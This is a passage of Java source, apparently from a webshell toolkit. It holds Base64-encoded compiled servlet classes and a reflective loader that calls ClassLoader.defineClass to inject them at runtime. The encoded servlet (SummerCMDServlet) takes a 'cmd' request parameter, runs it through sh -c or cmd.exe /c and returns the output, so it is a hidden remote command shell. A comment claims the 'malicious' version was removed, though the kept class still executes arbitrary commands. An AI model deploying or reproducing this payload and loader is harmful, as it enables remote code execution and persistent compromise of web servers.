sKAFIAXgwAXwBgAQAHaGFzTmV4dAEAAygpWgoAUgBiDABjADMBAARuZXh0CABlAQAACgAbAGcMAGgADgEABXdyaXRlCgAbAGoMAGsABgEABWZsdXNoCgAbAG0MAG4ABgEABWNsb3NlCABwAQADY21kCwByACQHAHMBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0BwB1AQAeY29tL3N1bW1lcjIzMy9TdW1tZXJDTURTZXJ2bGV0BwB3AQAVamF2YXgvc2VydmxldC9TZXJ2bGV0AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMY29tL3N1bW1lcjIzMy9TdW1tZXJDTURTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHAIMBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAHaXNMaW51eAEAAVoBAAVvc1R5cAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAA291dAEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEADVN0YWNrTWFwVGFibGUHAI0HAJ4BABNqYXZhL2lvL0lucHV0U3RyZWFtBwCgAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADmdldFNlcnZsZXRJbmZvAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABVTdW1tZXJDTURTZXJ2bGV0LmphdmEAIQB0AAIAAQB2AAAABgABAAUABgABAHgAAAAzAAEAAQAAAAUqtwABsQAAAAIAeQAAAAoAAgAAABAABAARAHoAAAAMAAEAAAAFAHsAfAAAAAEAfQB+AAIAeAAAADUAAAACAAAAAbEAAAACAHkAAAAGAAEAAAAVAHoAAAAWAAIAAAABAHsAfAAAAAAAAQB/AIAAAQCBAAAABAABAIIAAQCEAIUAAQB4AAAALAABAAEAAAACAbAAAAACAHkAAAAGAAEAAAAZAHoAAAAMAAEAAAACAHsAfAAAAAEAhgCHAAIAeAAAAzYABAANAAABcCwSB7kACQIALBIPuQARAgAsuQAUAQASGLYAGivAAB9OLRIhuQAjAgA6BBkExgCgBDYFEie4ACk6BhkGxgATGQa2AC4SNLYANpkABgM2BRUFmQAZBr0AL1kDEjpTWQQSPFNZBRkEU6cAFga9AC9ZAxI+U1kEEkBTWQUZBFM6B7gAQhkHtgBItgBMOgi7AFJZGQi3AFQSV7YAWToJGQm2AF2ZAAsZCbYAYacABRJkOgosuQAUAQAZCrYAZiy5ABQBALYAaSy5ABQBALYAbCsSb7kAcQIAOgUENgYSJ7gAKToHGQfGABMZB7YALhI0tgA2mQAGAzYGFQaZABkGvQAvWQMSOlNZBBI8U1kFGQVTpwAWBr0AL1kDEj5TWQQSQFNZBRkFUzoIuABCGQi2AEi2AEw6CbsAUlkZCbcAVBJXtgBZOgoZCrYAXZkACxkKtgBhpwAFEmQ6Cyy5ABQBADoMGQwZC7YAGhkMtgBpGQy2AGyxAAAAAwB5AAAAggAgAAAAHwAIACAAEAAhABsAIgAgACMAKgAkAC8AJQAyACYAOQAnAEsAKABOACoAaQArAH4ALACLAC0AmwAuAK8ALwC6ADAAwwAxAMwANADWADUA2QA2AOAANwDyADgA9QA6ASUAOwEyADwBQgA9AVYAPgFeAD8BZQBAAWoAQQFvAEIAegAAAMAAEwAyAJoAiACJAAUAOQCTAIoAiwAGAH4ATgCMAI0ABwCLAEEAjgCPAAgAmwAxAJAAkQAJAK8AHQCSAIsACgAAAXAAewB8AAAAAAFwAJMAlAABAAABcACVAJYAAgAgAVAAlwCYAAMAKgFGACIAiwAEANYAmgBwAIsABQDZAJcAiACJAAYA4ACQAIoAiwAHASUASwCMAI0ACAEyAD4AjgCPAAkBQgAuAJAAkQAKAVYAGgCSAIsACwFeABIAmQCaAAwAmwAAAGYAC/8ATgAHBwB0BwByBwAKBwAfBwAvAQcALwAAGlIHAJz+AC4HAJwHAJ0HAFJBBwAv/wAeAAUHAHQHAHIHAAoHAB8HAC8AAP4AKAcALwEHAC8aUgcAnP4ALgcAnAcAnQcAUkEHAC8AgQAAAAYAAgCCAJ8AAQChADMAAQB4AAAALAABAAEAAAACAbAAAAACAHkAAAAGAAEAAABGAHoAAAAMAAEAAAACAHsAfAAAAAEAogAGAAEAeAAAACsAAAABAAAAAbEAAAACAHkAAAAGAAEAAABLAHoAAAAMAAEAAAABAHsAfAAAAAEAowAAAAIApA==";
    // public static String SUMMER_CMD_SERVLET_CLASS_STRING_BASE64 = "yv66vgAAAEEAjwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQADY21kCwAKAAsHAAwMAA0ADgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwgAEAEAB29zLm5hbWUKABIAEwcAFAwAFQAOAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5CgAXABgHABkMABoAGwEAEGphdmEvbGFuZy9TdHJpbmcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CAAdAQADd2luCgAXAB8MACAAIQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCAAjAQACc2gIACUBAAItYwgAJwEAB2NtZC5leGUIACkBAAIvYwoAKwAsBwAtDAAuAC8BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsKACsAMQwAMgAzAQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsKADUANgcANwwAOAA5AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07BwA7AQARamF2YS91dGlsL1NjYW5uZXIKADoAPQwABQA+AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWCABAAQACXGEKADoAQgwAQwBEAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7CgA6AEYMAEcASAEAB2hhc05leHQBAAMoKVoKADoASgwASwAbAQAEbmV4dAgATQEAAAsATwBQBwBRDABSAFMBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7CgBVAFYHAFcMAFgAWQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCgBVAFsMAFwABgEABWZsdXNoCgBVAF4MAF8ABgEABWNsb3NlBwBhAQAeY29tL3N1bW1lcjIzMy9TdW1tZXJDTURTZXJ2bGV0BwBjAQAVamF2YXgvc2VydmxldC9TZXJ2bGV0AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMY29tL3N1bW1lcjIzMy9TdW1tZXJDTURTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHAG8BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNMaW51eAEAAVoBAAVvc1R5cAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAA291dAEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEADVN0YWNrTWFwVGFibGUHAH0HAIgBABNqYXZhL2lvL0lucHV0U3RyZWFtBwCKAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADmdldFNlcnZsZXRJbmZvAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABVTdW1tZXJDTURTZXJ2bGV0LmphdmEAIQBgAAIAAQBiAAAABgABAAUABgABAGQAAAAzAAEAAQAAAAUqtwABsQAAAAIAZQAAAAoAAgAAABAABAARAGYAAAAMAAEAAAAFAGcAaAAAAAEAaQBqAAIAZAAAADUAAAACAAAAAbEAAAACAGUAAAAGAAEAAAAVAGYAAAAWAAIAAAABAGcAaAAAAAAAAQBrAGwAAQBtAAAABAABAG4AAQBwAHEAAQBkAAAALAABAAEAAAACAbAAAAACAGUAAAAGAAEAAAAZAGYAAAAMAAEAAAACAGcAaAAAAAEAcgBzAAIAZAAAAYoABAALAAAAoSsSB7kACQIATgQ2BBIPuAAROgUZBcYAExkFtgAWEhy2AB6ZAAYDNgQVBJkAGAa9ABdZAxIiU1kEEiRTWQUtU6cAFQa9ABdZAxImU1kEEihTWQUtUzoGuAAqGQa2ADC2ADQ6B7sAOlkZB7cAPBI/tgBBOggZCLYARZkACxkItgBJpwAFEkw6CSy5AE4BADoKGQoZCbYAVBkKtgBaGQq2AF2xAAAAAwBlAAAAOgAOAAAAMgAJADMADAA0ABMANQAlADYAKAA4AFYAOQBjADoAcwA7AIcAPACPAD0AlgA+AJsAPwCgAEAAZgAAAHAACwAAAKEAZwBoAAAAAAChAHQAdQABAAAAoQB2AHcAAgAJAJgACAB4AAMADACVAHkAegAEABMAjgB7AHgABQBWAEsAfAB9AAYAYwA+AH4AfwAHAHMALgCAAIEACACHABoAggB4AAkAjwASAIMAhAAKAIUAAAAhAAX+ACgHABcBBwAXGVEHAIb+AC4HAIYHAIcHADpBBwAXAG0AAAAGAAIAbgCJAAEAiwAbAAEAZAAAACwAAQABAAAAAgGwAAAAAgBlAAAABgABAAAARABmAAAADAABAAAAAgBnAGgAAAABAIwABgABAGQAAAArAAAAAQAAAAGxAAAAAgBlAAAABgABAAAASQBmAAAADAABAAAAAQBnAGgAAAABAI0AAAACAI4=";
    // v1.0.3 - 删除掉原本的恶意Servlet保留我认为合适的Servlet - 也是可以正常使用的
    public static String SUMMER_CMD_SERVLET_CLASS_STRING_BASE64 = "yv66vgAAAEEAoAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAHnRoaXMgaXMgYSBTdW1tZXJDTURTZXJ2bGV0PGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgcAIAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QIACIBAANjbWQLAB8AJAwAJQAmAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsIACgBAAdvcy5uYW1lCgAqACsHACwMAC0AJgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQoALwAwBwAxDAAyADMBABBqYXZhL2xhbmcvU3RyaW5nAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwgANQEAA3dpbgoALwA3DAA4ADkBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWggAOwEAAnNoCAA9AQACLWMIAD8BAAdjbWQuZXhlCABBAQACL2MKAEMARAcARQwARgBHAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBDAEkMAEoASwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBNAE4HAE8MAFAAUQEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwcAUwEAEWphdmEvdXRpbC9TY2FubmVyCgBSAFUMAAUAVgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVggAWAEAAlxhCgBSAFoMAFsAXAEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwoAUgBeDABfAGABAAdoYXNOZXh0AQADKClaCgBSAGIMAGMAMwEABG5leHQIAGUBAAAKABsAZwwAaAAOAQAFd3JpdGUKABsAagwAawAGAQAFZmx1c2gKABsAbQwAbgAGAQAFY2xvc2UHAHABAB5jb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQHAHIBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAfgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAdpc0xpbnV4AQABWgEABW9zVHlwAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQANU3RhY2tNYXBUYWJsZQcAlgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QHAIgHAJkBABNqYXZhL2lvL0lucHV0U3RyZWFtBwCbAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADmdldFNlcnZsZXRJbmZvAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABVTdW1tZXJDTURTZXJ2bGV0LmphdmEAIQBvAAIAAQBxAAAABgABAAUABgABAHMAAAAzAAEAAQAAAAUqtwABsQAAAAIAdAAAAAoAAgAAAA8ABAAQAHUAAAAMAAEAAAAFAHYAdwAAAAEAeAB5AAIAcwAAADUAAAACAAAAAbEAAAACAHQAAAAGAAEAAAAUAHUAAAAWAAIAAAABAHYAdwAAAAAAAQB6AHsAAQB8AAAABAABAH0AAQB/AIAAAQBzAAAALAABAAEAAAACAbAAAAACAHQAAAAGAAEAAAAYAHUAAAAMAAEAAAACAHYAdwAAAAEAgQCCAAIAcwAAAfAABAALAAAAzSwSB7kACQIALBIPuQARAgAsuQAUAQASGLYAGivAAB9OLRIhuQAjAgA6BBkExgCgBDYFEie4ACk6BhkGxgATGQa2AC4SNLYANpkABgM2BRUFmQAZBr0AL1kDEjpTWQQSPFNZBRkEU6cAFga9AC9ZAxI+U1kEEkBTWQUZBFM6B7gAQhkHtgBItgBMOgi7AFJZGQi3AFQSV7YAWToJGQm2AF2ZAAsZCbYAYacABRJkOgosuQAUAQAZCrYAZiy5ABQBALYAaSy5ABQBALYAbLEAAAADAHQAAABOABMAAAAeAAgAHwAQACAAGwAhACAAIgAqACMALwAkADIAJQA5ACYASwAnAE4AKQBpACoAfgArAIsALACbAC0ArwAuALoALwDDADAAzAAyAHUAAABwAAsAMgCaAIMAhAAFADkAkwCFAIYABgB+AE4AhwCIAAcAiwBBAIkAigAIAJsAMQCLAIwACQCvAB0AjQCGAAoAAADNAHYAdwAAAAAAzQCOAI8AAQAAAM0AkACRAAIAIACtAJIAkwADACoAowAiAIYABACUAAAARwAG/wBOAAcHAG8HAJUHAAoHAB8HAC8BBwAvAAAaUgcAl/4ALgcAlwcAmAcAUkEHAC//AB4ABQcAbwcAlQcACgcAHwcALwAAAHwAAAAGAAIAfQCaAAEAnAAzAAEAcwAAACwAAQABAAAAAgGwAAAAAgB0AAAABgABAAAANgB1AAAADAABAAAAAgB2AHcAAAABAJ0ABgABAHMAAAArAAAAAQAAAAGxAAAAAgB0AAAABgABAAAAOwB1AAAADAABAAAAAQB2AHcAAAABAJ4AAAACAJ8=";

    public static Class<?> getClass(String classCode) throws IOException, InvocationTargetException,
            IllegalAccessException, NoSuchMethodException, InstantiationException {
        // 获取当前线程的上下文类加载器 ClassLoader
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        // 使用 Base64 解码一个Java类class文件的二进制数据的Base64编码的字符串成字节数组
        Base64.Decoder base64Decoder = Base64.getDecoder();
        byte[] decodeBytes = base64Decoder.decode(classCode);

        // 通过反射调用ClassLoader的defineClass方法，将字节数组转换为Class对象
        Method method = null;
        Class<?> clz = loader.getClass();
        // 在一个 while 循环中不断尝试获取该方法，如果当前类 clz 中没有找到 defineClass 方法，则继续向其父类查找，直到找到该方法或到达
        // Object 类为止
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }
        if (method != null) {
            // 一旦找到了 defineClass 方法，代码将其设置为可访问的（即使该方法是私有的）
            method.setAccessible(true);
            // 通过反射调用该方法，将解码后的字节数组 decodeBytes 转换为一个 Class 对象并返回
            return (Class<?>) method.invoke(loader, decodeBytes, 0, decodeBytes.length);
        }
        // 如果在整个过程中未能找到 defineClass 方法，则返回 null。
        return null;
    }
}